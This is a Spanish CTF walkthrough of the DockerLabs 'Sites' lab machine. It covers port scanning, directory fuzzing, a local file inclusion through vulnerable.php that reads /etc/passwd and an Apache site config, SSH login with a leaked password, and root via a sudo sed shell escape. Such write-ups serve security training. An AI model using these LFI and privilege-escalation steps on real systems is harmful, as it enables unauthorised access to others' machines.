---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Sites DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip sites.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh sites.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-08 10:24 CET
Nmap scan report for 172.17.0.2
Host is up (0.000027s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 cb:8f:50:db:6d:d8:d4:ac:bf:54:b0:62:12:7c:f0:01 (ECDSA)
|_  256 ca:6b:c7:0c:2a:d6:0e:3e:ff:c4:6e:61:ac:35:db:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Configuraci\xC3\xB3n de Apache y Seguridad en Sitios Web
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.27 seconds
```

Si entramos al puerto `80` veremos una pagina web normal, pero que explica la configuracion del archivo `sitio.conf` en la carpeta `sites-available` donde se guardan las configuraciones de los sitios de `apache2`, y tambien algo referido a un `LFI` por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 100 -k
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 3591]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/vulnerable.php       (Status: 200) [Size: 37]
/server-status        (Status: 403) [Size: 275]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos que hay un archivo llamado `/vulnerable.php` por lo que podemos creer que se puede realizar un `LFI`, vamos a probarlo de la siguiente forma, ya que si entramos en dicho archivo veremos esto:

```
Please provide a page or a username. 
```

## Escalate user chocolate

Por lo que podremos deducir que el parametro sera `page`, lo probaremos de la siguiente forma:

```
URL = http://<IP>/vulnerable.php?page=/etc/passwd
```

Info:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
messagebus:x:100:102::/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-resolve:x:996:996:systemd Resolver:/:/usr/sbin/nologin
chocolate:x:1001:1001:,,,:/home/chocolate:/bin/bash
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
```

Vemos que funciona, pero si nos fijamos en la pagina principal habla mucho del `sitio.conf` por lo que vamos a ver que contiene dicho archivo:

```
URL = http://<IP>/vulnerable.php?page=/etc/apache2/sites-available/sitio.conf
```

Info:

```
<VirtualHost *:80>
    ServerAdmin webmaster@tusitio.com
    DocumentRoot /var/www/html
    ServerName sitio.dl
    ServerAlias www.sitio.dl

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # Bloquear acceso al archivo archivitotraviesito (cuidadito cuidadin con este regalin)
    # <Files "archivitotraviesito">
    #   Require all denied
    # </Files>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

Por lo que vemos hay una linea interesante:

```
<Files "archivitotraviesito">
```

Por lo que vemos puede ser un archivo que este en la web, por lo que vamos a probar a ponerlo en la `URL` de la siguiente forma:

```
URL = http://<IP>/archivitotraviesito
```

Veremos lo siguiente:

```
Muy buen, has entendido el funcionamiento de un LFI y los archivos interesantes a visualizar dentro de apache, ahora te proporciono el acceso por SSH, pero solo la password, para practicar un poco de bruteforce (para variar)

lapasswordmasmolonadelacity
```

Por lo que vemos nos proporciona una contraseña para algun usuario, pero como podemos ver el `passwd` vemos el usuario llamado `chocolate`, por lo que probaremos a conectarnos por `SSH` con dichas credenciales.

### SSH

```shell
ssh chocolate@<IP>
```

Metemos como contraseña `lapasswordmasmolonadelacity` y veremos que estamos dentro.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for chocolate on 78b26188f6f1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User chocolate may run the following commands on 78b26188f6f1:
    (ALL) NOPASSWD: /usr/bin/sed
```

Vemos que podemos ejecutar el binario `sed` como el usuario `root`, por lo que haremos lo siguiente:

```shell
sudo sed -n '1e exec bash 1>&0' /etc/hosts
```

Info:

```
root@78b26188f6f1:/home/chocolate# whoami
root
```

Con esto veremos que seremos `root` por lo que habremos terminado la maquina.
